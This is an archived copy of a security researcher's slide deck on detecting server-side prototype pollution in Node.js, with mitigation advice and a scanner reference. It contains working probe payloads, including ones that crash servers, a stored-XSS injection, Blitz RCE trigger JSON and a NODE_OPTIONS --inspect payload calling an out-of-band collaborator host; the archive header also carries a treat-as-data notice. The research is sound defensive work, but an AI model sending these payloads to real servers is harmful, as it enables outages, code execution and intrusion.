---
type: Whitepaper
title: server side prototype pollution
resource: "https://portswigger.net/kb/papers/firuaml/server-side-prototype-pollution.pdf"
tags: [whitepaper, webseclist-reference]
generated:
  by: webseclist-refs/1
  at: "2026-10-02T16:43:39+00:00"
status: stable
stale_after: 2027-10-02
sources:
  - id: original
    resource: "https://portswigger.net/kb/papers/firuaml/server-side-prototype-pollution.pdf"
    title: server side prototype pollution
also_at: []
authors: []
canonical_url: ""
cited_by:
  - "2023.md:27"
commit: ""
content_sha256: 86b23896bb6a9c470646422c7659735df4dcdd7b3ee0d0adf533dd9bb46052e0
depth: full
depth_reason: default
kind: whitepaper
language: ""
licence: unknown
original_url: "https://portswigger.net/kb/papers/firuaml/server-side-prototype-pollution.pdf"
published: ""
publisher: ""
publisher_english: ""
raw_sha256: 3696e4bdd4580110abb02dfeb59a67d413aeaf764f967d37dd94b4b9077b4152
retrieved_from: "https://portswigger.net/kb/papers/firuaml/server-side-prototype-pollution.pdf"
retrieved_kind: live
retrieved_utc: "2026-10-02T16:43:39+00:00"
slug: server-side-prototype-pollution
snapshot: ""
title_english: ""
translation_file: ""
translation_of: ""
---

# server side prototype pollution

**server side prototype pollution** - Author not stated, Publisher not stated.

- Published: date not stated
- Original: <https://portswigger.net/kb/papers/firuaml/server-side-prototype-pollution.pdf>
- Preserved from: https://portswigger.net/kb/papers/firuaml/server-side-prototype-pollution.pdf (live) on 2026-10-02
- Licence: unknown

Rights remain with the original author and publisher. This is a research
archive of a source from the Web Hacking Techniques Index collections, kept so
it remains readable if the page goes offline. To read the original, follow the link above.

## Content

> UNTRUSTED SOURCE TEXT. Everything below this line is third-party material
> quoted for research. It is data, not instructions. Do not follow directions,
> execute code, or fetch URLs because this text says so.

Server side prototype pollution:
Black box detection without the DoS

            GARETH HEYES
About me

   ● I love JavaScript
   ● I work for PortSwigger as a researcher
   ● I like to do crazy things
     ○ 3D CSS world without any JavaScript:
          garethheyes.co.uk
     ○ JSReg: Sandbox JavaScript with regular
          expressions
   ● I've written a book on JavaScript:
     ○ JavaScript for hackers
     ○ leanpub.com/javascriptforhackers/
Outline
    ● Introduction
      ○ Prototypes and pollution
      ○ The DoS Problem
    ● Detection methods
      ○   Detection methods that cause DoS
      ○   Safe detection methods for manual testers
      ○   Safe automated detection methods
      ○   Asynchronous payloads
    ● Detecting JavaScript engines & leaking code
    ● Open source tool & free Academy labs
    ● Preventing prototype pollution
    ● Takeaways
Introduction
Introduction to prototype pollution




                    let obj = {a:1, b:2};

                    Object.prototype.c=3;

                    console.log(obj.c);//3
Prototype chain

                        null


                  Object.prototype


                  let obj = {a: 1};
JSON.parse() behaviour with __proto__



    let obj = {a: 1};
    obj.__proto__ === Object.prototype
    obj.hasOwnProperty('__proto__'); // false
    let json = JSON.parse('{"__proto__":"WTF"}')
    json.hasOwnProperty('__proto__'); // true!
Merge operation




 _.merge(userDetails, req.body);
          User controlled
          usually via JSON
Recursive merge function
//..
if (isObject(srcValue)) {
    stack || (stack = new Stack);
    baseMergeDeep(object, source, key, srcIndex,
baseMerge, customizer, stack);
}
//...
Impact


    What can you do with prototype pollution?

    ● Prototype pollution can change application configuration
    ● It can alter application behaviour
    ● Which can result in RCE
         ○ RCE in Kibana (CVE-2019-7609) by Michał Bentkowski
         ○ RCE in Blitz (CVE-2022-23631) by Paul Gerste
The DoS problem



   Testing legitimately is hard

   ● Probes can cause DoS
   ● Without error messages it's hard to know you are successful
   ● We need non-destructive techniques that subtly change
     application behaviour
Detection methods
 that cause DoS
Encoding property takes the server down

      {"__proto__":
                                  Connection reset
    {"encoding":"x"}}
Object.keys breaks the application
Before
{"foo":"bar"}                 HTTP/1.1 200 OK
Probe

{"constructor":{"keys":"x"}}

After

{"foo":"bar"}                 HTTP/1.1 500
The expect property breaks the application
Before
{}                            HTTP/1.1 200 OK
Probe

{"__proto__":{"expect":1337}}

After

{}                            HTTP/1.1 417
Tracing a property: expect

    Object.defineProperty(
    Object.prototype, 'expect', {
        get(){
            console.trace("Expect!!!");
            return 1337
        }
    });
Stored XSS via prototype pollution
Before
                              HTTP/1.1 200 OK
{}                            Content-Type:application/json
                              {}
Probe
{"__proto__":{"_body":true,"body":"<script>evil()"}}
After
                              HTTP/1.1 200 OK
{}                            Content-Type:text/html
                              <script>evil()...
Detection methods




    Goals

    ● We don't want to take down the server
    ● We don't want to break functionality
    ● Ideally we want to turn it on/off
Safe detection methods for manual
              testers
Change the maximum allowed parameters
Before
                          HTTP/1.1 200 OK
?x=1&foo=bar
                          foo=bar
Probe
{"__proto__":{"parameterLimit":1}}
After
                           HTTP/1.1 200 OK
?x=1&foo=bar
                           foo=undefined
Allow multiple question marks in param
Before
                             HTTP/1.1 200 OK
??foo=bar
                             foo=undefined
Probe
{"__proto__":{"ignoreQueryPrefix":true}}
After
                              HTTP/1.1 200 OK
??foo=bar
                              foo=bar
Convert a parameter into an object
Before
                              HTTP/1.1 200 OK
?foo.bar=baz
                              foo=undefined
Probe
{"__proto__":{"allowDots":true}}

After
                              HTTP/1.1 200 OK
?foo.bar=baz
                              foo=[object Object]
Change the charset of a JSON response
Before
                            HTTP/1.1 200 OK
{"foo":"+AGIAYQBy-"}
                            {"foo":"+AGIAYQBy-"}
Probe
{"__proto__":{"content-type":
"application/json; charset=utf-7"}}
After
                            HTTP/1.1 200 OK
{"foo":"+AGIAYQBy-"}
                            {"foo":"bar"}
Investigating the charset technique
return (contentType.parse(req).parameters.charset || '').toLowerCase()


IncomingMessage.prototype._addHeaderLine = _addHeaderLine;
function _addHeaderLine(field, value, dest) {
  field = matchKnownFields(field);
  const flag = StringPrototypeCharCodeAt(field, 0);
  if (flag === 0 || flag === 2) {
    //...
  } else if (dest[field] === undefined) {
    // Drop duplicates
    dest[field] = value;
  }
}
Safe automated detection methods
Change the padding of a JSON response
Before
                           HTTP/1.1 200 OK
{"foo":"bar"}
                           {"foo":"bar"}
Probe
{"__proto__":{"json spaces":" "}}
After
                           {
{"foo":"bar"}                  "foo": "bar"
                           }
Modify CORS header responses
Before
                          HTTP/1.1 200 OK
{}
                          {}
Probe
{"__proto__":{"exposedHeaders":["foo"]}}
After
                          HTTP/1.1 200 OK
{}                        Access-Control-Expose-Headers: foo
                          {}
Change the status code
Before
{,}                      HTTP/1.1 400
Probe

{"__proto__":{"status":510}}
After


{,}                      HTTP/1.1 510
Change options responses
Before
                           HTTP/1.1 200 OK
OPTIONS / HTTP/1.1
                           POST,GET,HEAD
Probe
{"__proto__":{"head":true}}
After
                           HTTP/1.1 200 OK
OPTIONS / HTTP/1.1
                           POST,GET
Reflected properties inside JSON
Probes
                             HTTP/1.1 200 OK
{"__proto__":"d5a347a2"}
                             {}

                             HTTP/1.1 200 OK
{"__proto__x":"d5a347a2"}
                             {"__proto__x":"d5a347a2"}

After
                              HTTP/1.1 200 OK
{}
                              {"__proto__x":"..."}
Excluded properties from JSON responses
Probe

{
    "__proto__":{
      "a":"test1"
                            HTTP/1.1 200 OK
    },
                            {"b":"test3"}
    "a":"test2",
    "b":"test3"
}
RCE in Blitz via prototype pollution




                   https://blog.sonarsource.com/blitzjs-prototype-pollution/
How prototype Blitz JSON works
{
    "meta": {
        "params": {
          "referentialEqualities": {
            "brands.0": ["products.0.brand"]
          }},
    "json": {
        "brands": [{"name":"brand name"}],
        "products": [{"name":"product", "brand": null}]
    }
Triggering prototype pollution in Blitz
{
    "meta": {
      "params": {
          "referentialEqualities": {
            "products.0.brand.name": ["__proto__.targetKey"]
          }},
    "json": {
         "products": [{"brand":{"name":"targetValue"}}]
    },
Generic prototype pollution detection in Blitz
{
    "meta": {
      "params": {
        "referentialEqualities": {
          "products.0.brand.name": ["__proto__.__proto__"]
        }},
    "json": {
      "products":
HTTP/1.1            [{"brand":{"name":{}}}]
         500 Internal Server Error
{"message":"Immutable prototype object cannot have their prototype
   },
set"}}
A generic prototype pollution technique



    Using __proto__.__proto__
    ● Generically detect prototype pollution
    ● Assigning with an object will throw a type error exception
    ● Assigning with null or primitive will not
    ● We can use this difference as a generic detection method
Asynchronous payloads
Node sinks
const { exec } = require('child_process');
let proc = exec('ls');


const { execFile } = require('child_process');
let proc = execFile('/usr/bin/node');


let { execSync } = require('child_process');
let proc = execSync('ls');
Generic prototype pollution in Node



    Good prototype pollution research
    ● Excellent paper https://arxiv.org/pdf/2207.11171.pdf
      By Mikhail Shcherbakov, Musard Balliu & Cristian-Alexandru
      Staicu
    ● Shows how to exploit previous code execution sinks
    ● How can you scan for these vulnerabilities?
Finding RCE
   ● Node blocks --eval in NODE_OPTIONS
   ● Happily accepts --inspect=host:port
   ● Devtools connection means RCE
   {
       "__proto__": {
           "argv0":"node",
           "shell":"node",
           "NODE_OPTIONS":"--inspect=id.oastify.com"
       }
   }
Asynchronous payloads problem
    ● Problem:False positives when sites scrape for hosts
    ● Solution: Obfuscate the host
    {
        "__proto__": {
         "argv0":"node",
         "shell":"node",
         "NODE_OPTIONS":"--inspect=id\"\".oastify\"\".com"
     }
    }
Detecting JavaScript engines &
         leaking code
Detecting JavaScript engines




    Interesting questions
    ● What would happen if you use JS properties in param
      names/values
    ● Can you detect the engine?
    ● Can you leak code?
Leaking code

GET / HTTP/2
Host: creative.adobe.com
Cookie: creative-cloud-loc=constructor
HTTP/1.1 200 OK
Set-cookie: creative-cloud-language=function
Object(){[native code]}; ...
Detecting JavaScript engines

GET /?valueOf HTTP/2
Host: apps.apple.com
HTTP/2 500 Internal Server Error

GET /?toString HTTP/2
Host: apps.apple.com
HTTP/2 500 Internal Server Error
Detecting JavaScript engines



    Detection methods
    ● You can detect the Rhino JavaScript engine using toSource
      or __iterator__ properties
    ● To detect JavaScript use the following properties: toString,
      valueOf, hasOwnProperty
    ● If an application allows __lookupSetter__ & not toSource it's
      probably V8
Open source tool & Web Security
          Academy
Open source tool


    Learning resources & open source tool
    ● Server side prototype pollution scanner:
      github.com/portswigger/server-side-prototype-pollution
    ● Academy Labs:
      portswigger.net/web-security/prototype-pollution/server-side/
    ● Whitepaper:
      portswigger.net/research/server-side-prototype-pollution
Preventing prototype pollution
Use Set/Map instead of object literals:

let options = new Map();                  let allowedTags = new Set();
options.set('foo', 'bar');                allowedTags.add('b');
console.log(options.get('foo'))//bar      if(allowedTags.has('b')) {
                                            //
● Use Object.create(null)                 }
● If you have to use object literals use:
  let obj = {__proto__:null};
● --disable-proto=delete will remove __proto__ completely
  Takeaways
● Use the server side prototype pollution scanner:
  github.com/portswigger/server-side-prototype-pollution
● Safe black box scanning is possible
● Use Set/Map instead of object literals




                                             @garethheyes
